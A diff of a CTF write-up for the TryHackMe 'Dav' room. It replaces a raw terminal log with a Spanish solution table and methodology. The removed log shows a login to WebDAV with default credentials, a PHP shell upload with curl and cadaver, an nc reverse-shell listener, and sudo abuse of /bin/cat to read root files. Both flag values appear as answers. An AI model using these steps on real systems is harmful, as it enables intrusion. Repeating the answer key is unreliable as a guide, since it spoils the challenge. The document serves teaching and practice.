@@ -1,176 +1,33 @@
-```┌──(kali㉿kali)- 
-└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.137.183
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 18:17 EDT
-Nmap scan report for 10.10.137.183
-Host is up (0.19s latency).
-Not shown: 999 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.92%E=4%D=9/25%OT=80%CT=1%CU=40003%PV=Y%DS=2%DC=T%G=Y%TM=6330D39
-OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
-OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
-OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
-OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
-OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
-OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
-OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
-OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
-OS:=S)
+# Dav
 
-Network Distance: 2 hops
-
-TRACEROUTE (using port 443/tcp)
-HOP RTT       ADDRESS
-1   191.74 ms 10.18.0.1
-2   192.17 ms 10.10.137.183
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds
-zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.137.183
-
-┌──(kali㉿kali)- 
-└─$ feroxbuster --url http://10.10.137.183 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
-
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.7.0
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://10.10.137.183
- 🚀  Threads               │ 60
- 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
- 💢  Status Code Filters   │ [404, 403]
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.7.0
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
- 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-200      GET      375l      968w    11321c http://10.10.137.183/
-200      GET      375l      968w    11321c http://10.10.137.183/index.html
-401      GET       14l       54w      460c http://10.10.137.183/webdav
-
-need credentials
-
-https://xforeveryman.blogspot.com/
-
-user: wampp
-pass: xampp 
-
-found
-
-wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
-
-Now that we have access, let’s confirm if the server allows us to put files: 
-
-┌──(kali㉿kali)- 
-└─$ cat Note      
-# Dav [EASY]
-
-This branch is being used to test the code with the mysql server. 
-                                                                                                         
-┌──(kali㉿kali)- 
-└─$ curl -u "wampp:xampp" -X PUT http://10.10.137.183/webdav/Note
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>201 Created</title>
-</head><body>
-<h1>Created</h1>
-<p>Resource /webdav/Note has been created.</p>
-<hr />
-<address>Apache/2.4.18 (Ubuntu) Server at 10.10.137.183 Port 80</address>
-</body></html>
-
-The file  is successfully uploaded to the server. 
-
-Using cadaver
-
-┌──(kali㉿kali)-[~/Downloads]
-└─$ cadaver http://10.10.137.183/webdav
-Authentication required for webdav on server `10.10.137.183':
-Username: wampp
-Password: 
-dav:/webdav/> put shell.php5
-Uploading shell.php5 to `/webdav/shell.php5':
-Progress: [=============================>] 100.0% of 5489 bytes succeeded.
-dav:/webdav/> quit
-Connection to `10.10.137.183' closed.
-
-revshell
-
-┌──(kali㉿kali)-[~]
-└─$ rlwrap nc -nlvp 4444
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 10.10.137.183.
-Ncat: Connection from 10.10.137.183:40198.
-Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
- 15:45:08 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ SHELL=/bin/bash script -q /dev/null
-www-data@ubuntu:/$ 
-
-www-data@ubuntu:/$ cd /home
-cd /home
-www-data@ubuntu:/home$ ls
-ls
-merlin  wampp
-www-data@ubuntu:/home$ cd merlin
-cd merlin
-www-data@ubuntu:/home/merlin$ ls -la
-ls -la
-total 44
-drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
-drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
--rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
--rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
--rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
-drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
--rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
-drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
--rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
--rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
--rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
--rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
-www-data@ubuntu:/home/merlin$ cat user.txt
-cat user.txt
-449b40fe93f78a938523b7e4dcd66d2a
-
-www-data@ubuntu:/home/merlin$ sudo -l
-sudo -l
-Matching Defaults entries for www-data on ubuntu:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on ubuntu:
-    (ALL) NOPASSWD: /bin/cat
-www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
-sudo cat /root/root.txt
-101101ddc16b0cdf65ba0b8a7af7afa5
-```
-
-1. 1. 449b40fe93f78a938523b7e4dcd66d2a
-   2. 101101ddc16b0cdf65ba0b8a7af7afa5
+| **Dificultad** | Easy |
+| **Tipo** | CTF (WebDAV) |
+| **Slug** | `bsidesgtdav` |
+| **Link** | [TryHackMe](https://tryhackme.com/room/bsidesgtdav) |
+| **Sección** | 01 Level Easy |
+| **Fuente** | TryHackMe |
+| **Componentes** | Nmap / feroxbuster / WebDAV / curl / cadaver / reverse shell / sudo |
+| **Impacto** | Reto tipo CTF: explotar un directorio WebDAV de Apache mal protegido para subir una shell y escalar a root abusando de un sudo permitido sobre /bin/cat. |
 
 ---
 
-## ⚠️ Descargo de Responsabilidad (Disclaimer)
+**Contexto:** El escaneo inicial muestra Apache en el puerto 80 con un directorio `/webdav` protegido (401). Las credenciales por defecto se adivinan como `wampp:xampp` y una nota en el servidor confirma que está pensado para trabajar con MySQL. El directorio permite subir ficheros (método PUT), por lo que se sube una shell `.php5` con cadaver para obtener una reverse shell como www-data. Tras leer `user.txt` de merlin, la escalada es trivial: `sudo -l` muestra que www-data puede ejecutar `/bin/cat` como root.
 
-Este contenido se presenta exclusivamente con fines académicos y educativos.
+## Solucionario
 
-**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
-**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
-**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
-**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
+### Task 2: Flags de usuario y root
+
+| # | Pregunta | Respuesta |
+|---|----------|-----------|
+| 1 | ¿Cuál es el valor del user.txt? | `449b40fe93f78a938523b7e4dcd66d2a` |
+| 2 | ¿Cuál es el valor del root.txt? | `101101ddc16b0cdf65ba0b8a7af7afa5` |
+
+---
+
+**Metodología:** Enumeración con nmap y feroxbuster descubre `/webdav` con código 401. Probando credenciales típicas de WAMP se entra con `wampp:xampp`; la nota `Note` y el hash `$apr1$...` confirman el usuario. Se valida que el servidor permite PUT con `curl -X PUT` y se sube la shell con cadaver (`put shell.php5`). Al visitar la shell se recibe la reverse shell como www-data; leyendo `/home/merlin/user.txt` se obtiene la primera flag y con `sudo cat /root/root.txt` la segunda, ya que el usuario puede ejecutar `/bin/cat` como root sin contraseña.
+
+**Learning chain:** escaneo → fuzzing de directorios → autenticación por defecto → abuso de WebDAV (PUT) → reverse shell → abuso de sudo.
+
+**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1110.001 (Password Guessing), T1505.003 (Web Shell), T1059 (Command and Scripting Interpreter), T1548 (Abuse Elevation Control Mechanism)
+
+**Fuente:** [TryHackMe - Dav](https://tryhackme.com/room/bsidesgtdav)
